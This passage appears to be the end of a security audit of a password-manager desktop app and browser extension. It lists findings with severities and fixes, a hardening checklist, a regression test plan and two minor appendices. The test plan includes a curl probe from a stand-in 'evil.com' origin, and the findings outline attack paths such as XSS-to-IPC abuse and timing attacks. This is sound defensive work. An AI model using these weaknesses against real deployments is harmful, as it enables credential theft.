| B-CRIT-02 | HTTP Endpoints | **CRITICAL** | Unauthenticated read/write to PostgreSQL adapter | Add middleware auth to all routes | **P0** |
| B-CRIT-03 | Preload | **CRITICAL** | XSS in renderer → full IPC access → screen capture, SSRF, data theft | Strict IPC channel allowlist | **P0** |
| I-EXT-01 | Background | **CRITICAL** | Content script on any page proxies requests to all Electron endpoints | Endpoint allowlist in proxy | **P0** |
| C-PIPE-01 | Commit | **CRITICAL** | Page swaps field between preview and commit (no mutation guard) | Implement MutationObserver guard | **P0** |
| C-PIPE-02 | Commit | **CRITICAL** | TOCTOU race: async checks then sync inject | Re-validate fingerprint immediately before write | **P0** |
| B-HIGH-01 | Crypto | **HIGH** | Offline brute-force of weak scrypt (N=16384) | Raise to N≥65536 | **P1** |
| B-HIGH-02 | VSBT | **HIGH** | Timing attack on token comparison | Use `timingSafeEqual` | **P1** |
| B-HIGH-03 | DB | **HIGH** | DEK hex string persists in V8 heap | Minimize scope, native addon path | **P1** |
| B-HIGH-04 | Electron | **HIGH** | Renderer sandbox disabled (`--no-sandbox`) | Remove in production | **P1** |
| B-HIGH-05 | Electron | **HIGH** | `nodeIntegration: true` in credential window | Refactor to `contextIsolation` | **P1** |
| C-PIPE-03 | Commit | **HIGH** | `setAttribute('value', password)` exposes in DOM | Remove for sensitive fields | **P1** |
| C-PIPE-04 | Overlay | **HIGH** | Synthetic Enter keypress bypasses consent | Check `e.isTrusted` | **P1** |
| C-PIPE-05 | Commit | **HIGH** | Prototype getter intercepts password on read | Use prototype getter for verify | **P1** |
| I-EXT-02 | Background | **HIGH** | No sender validation on messages | Validate `sender.id` | **P1** |
| E-SAVE-01 | Credential Store | **HIGH** | Domain matching without PSL → cross-subdomain leakage | Integrate PSL, unidirectional matching | **P1** |
| F-QI-01 | QuickSelect | **MED-HIGH** | Cross-domain credential enumeration | Default domain-scoped results | **P2** |
| B-MED-01 | Crypto | **MEDIUM** | No AAD on encryption layers | Bind record ID as AAD | **P2** |
| B-MED-02 | Logging | **MEDIUM** | Item titles in console logs | Log ID only | **P2** |
| B-MED-03 | RPC | **MEDIUM** | Error messages leak internals | Return generic errors | **P2** |
| B-MED-04 | Logging | **MEDIUM** | WS messages logged verbatim (incl passwords) | Redact sensitive params | **P2** |
| B-MED-05 | Cache | **MEDIUM** | 60s plaintext cache window | Reduce TTL to 5-10s | **P2** |
| B-MED-06 | Storage | **MEDIUM** | Registry file world-readable | Use atomic write with 0o600 | **P2** |
| D-OVER-01 | Overlay | **MEDIUM** | Page detects/removes/covers overlay host | Randomize attrs, monitor opacity | **P2** |
| E-SAVE-02 | Save Bar | **MEDIUM** | Password in innerHTML template | Use DOM API | **P2** |
| E-SAVE-03 | Submit Watcher | **MEDIUM** | Fetch/XHR hooks ineffective in MV3 isolated world | Main world injection | **P2** |
| E-SAVE-04 | Orchestrator | **MEDIUM** | Promise leak on rapid submissions | Resolve before null | **P2** |
| G-TOG-01 | Toggle Sync | **MEDIUM** | No schema validation on toggle messages | Add runtime type check | **P2** |
| I-EXT-03 | Background | **MEDIUM** | VSBT in chrome.storage.session | Verify access level never broadened | **P2** |
| I-EXT-04 | Background | **MEDIUM** | Vault responses persisted in chrome.storage.local | Remove fallback storage | **P2** |
| I-EXT-05 | API | **MEDIUM** | Debug logs on window object | Remove in production | **P2** |
| I-EXT-06 | CSP | **MEDIUM** | `connect-src https://*` allows exfiltration | Restrict to known domains | **P2** |
| F-QI-02 | Vault Index | **MEDIUM** | Race between clear and build | Generation counter | **P3** |
| C-PIPE-06 | Fingerprint | **MEDIUM** | 64-bit hash truncation | Increase to 128 bits | **P3** |
| B-LOW-01 | Settings | **LOW** | autoLockMinutes=0 disables lock | Enforce minimum | **P3** |
| B-LOW-02 | Auth | **LOW** | Rate limit resets on restart | Persistent rate limit | **P3** |

---

## SECTION L — High Assurance Hardening Checklist

### L.1 Immediate Fixes (P0 — Do Before Any Release)

- [ ] **Restrict CORS** to `chrome-extension://<extension-id>` on the HTTP server (B-CRIT-01)
- [ ] **Add authentication middleware** to ALL HTTP endpoints, not just `/api/vault/*` (B-CRIT-02)
- [ ] **Replace preload IPC bridge** with a strict channel allowlist (B-CRIT-03)
- [ ] **Add endpoint allowlist** to `ELECTRON_API_PROXY` handler (I-EXT-01)
- [ ] **Implement MutationObserver guard** between overlay preview and commit (C-PIPE-01)
- [ ] **Re-validate fingerprint synchronously** immediately before value injection (C-PIPE-02)

### L.2 Short-Term Improvements (P1 — Within 2 Weeks)

- [ ] **Raise scrypt N** to ≥65536 and remove the hard clamp (B-HIGH-01)
- [ ] **Use `timingSafeEqual`** for VSBT validation (B-HIGH-02)
- [ ] **Remove `--no-sandbox`** flag from production builds (B-HIGH-04)
- [ ] **Refactor credential dialog** to `contextIsolation: true` (B-HIGH-05)
- [ ] **Remove `setAttribute('value',...)`** for sensitive fields in committer (C-PIPE-03)
- [ ] **Check `e.isTrusted`** in overlay keydown and mousedown handlers (C-PIPE-04)
- [ ] **Use prototype getter** for post-write value verification (C-PIPE-05)
- [ ] **Validate `sender.id`** in `chrome.runtime.onMessage` handler (I-EXT-02)
- [ ] **Integrate PSL** into `credentialStore.domainMatches` (E-SAVE-01)
- [ ] **Minimize DEK hex string scope** in db.ts (B-HIGH-03)

### L.3 Structural Upgrades (P2 — Within 1 Month)

- [ ] **Default QuickSelect to domain-scoped** results (F-QI-01)
- [ ] **Add AAD** (record ID) to both encryption layers (B-MED-01)
- [ ] **Redact all console.log** statements: remove titles, passwords, message bodies (B-MED-02, B-MED-04)
- [ ] **Return generic error messages** from RPC and HTTP routes (B-MED-03)
- [ ] **Reduce decrypt cache TTL** to 5-10 seconds (B-MED-05)
- [ ] **Use atomic write** for registry file (B-MED-06)
- [ ] **Randomize overlay host attributes** and add opacity/pointer monitoring (D-OVER-01)
- [ ] **Build save bar password input** via DOM API, not innerHTML (E-SAVE-02)
- [ ] **Inject fetch/XHR hooks** into main world for SPA detection (E-SAVE-03)
- [ ] **Fix promise leak** in save bar teardown (E-SAVE-04)
- [ ] **Add schema validation** to toggle sync messages (G-TOG-01)
- [ ] **Remove vault response fallback** from chrome.storage.local (I-EXT-04)
- [ ] **Remove `window.vaultDebugLogs`** in production (I-EXT-05)
- [ ] **Restrict CSP** `connect-src` to specific domains (I-EXT-06)

### L.4 Architectural Changes (P3 — Within 1 Quarter)

- [ ] **Centralize history hooking** into a single module (submitWatcher + SPA watcher conflict)
- [ ] **Add generation counter** to vault index build/clear cycle (F-QI-02)
- [ ] **Increase fingerprint hash** to 128 bits (C-PIPE-06)
- [ ] **Enforce minimum autoLockMinutes** (B-LOW-01)
- [ ] **Persist rate-limit state** across restarts (B-LOW-02)
- [ ] **Implement enterprise policy lock** with immutable security flags (Section J)
- [ ] **For high-assurance profile**: store only tokens in search index, not titles/usernames

### L.5 Security Regression Testing Plan

| Test Category | What to Verify | Method |
|---|---|---|
| CORS enforcement | No non-extension origin can reach HTTP API | Automated: curl from `Origin: https://evil.com`, expect 403 |
| Auth middleware | Non-vault endpoints reject unauthenticated requests | Automated: curl without auth header, expect 401 |
| IPC allowlist | Renderer cannot invoke unlisted channels | Unit test: mock `ipcRenderer.invoke` with blocked channel |
| Proxy allowlist | `ELECTRON_API_PROXY` rejects non-allowed endpoints | Unit test: send message with `/api/db/get-all`, expect rejection |
| MutationObserver guard | DOM swap between preview and commit blocks fill | E2E: Playwright injects mutation script, verify `COMMIT_BLOCKED` |
| Fingerprint re-validation | Changed field name after preview blocks commit | E2E: modify `input.name` after overlay shows, verify error |
| `isTrusted` check | Synthetic Enter does not trigger insert | E2E: dispatch synthetic KeyboardEvent, verify no fill |
| VSBT timing-safe | Token comparison uses `timingSafeEqual` | Code review + unit test measuring response time variance |
| setAttribute removal | Password never appears in DOM attributes | E2E: fill password, query `getAttribute('value')`, expect null |
| Domain scoping | PSL domain stored → no cross-subdomain match | Unit test: store for `github.io`, test against `x.github.io` |
| Audit redaction | No passwords in audit log | Unit test: trigger fill, read audit log, grep for password |
| Console redaction | No sensitive data in console.log | Code search: verify no `title`, `password`, `masterPassword` in log calls |
| Enterprise locks | Immutable flags cannot be overridden by user settings | Unit test: call `updateSettings` on locked flag, verify rejection |

---

## Appendix: `window.name` Information Leakage

**File**: `content-script.tsx:17-77`
**Severity**: LOW

The content script stores extension state (tab role, session key) in `window.name`, which is readable by page scripts across navigations. While no vault data is stored here, the `sessionKey` and `role` values reveal that the extension is active and provide fingerprinting information.

**Fix**: Use `chrome.storage.session` for tab state instead of `window.name`.

---

## Appendix: `isOurShadowHost` Attribute Mismatch

**File**: `hardening.ts:644-649`
**Severity**: LOW

`isOurShadowHost` checks for `data-wrv-save-bar`, but the save bar uses `data-wrv-save-icon` and `data-wrv-save-dialog`. This causes the elementFromPoint clickjacking guard to incorrectly flag the save bar's host as a covering element.

**Fix**: Update to check correct attributes:
```typescript
function isOurShadowHost(el: Element): boolean {
  return el.hasAttribute('data-wrv-quickselect') ||
         el.hasAttribute('data-wrv-qs-icon') ||
         el.id === 'wrv-autofill-overlay' ||
         el.hasAttribute('data-wrv-save-icon') ||
         el.hasAttribute('data-wrv-save-dialog')
}
```

---

*End of audit report.*
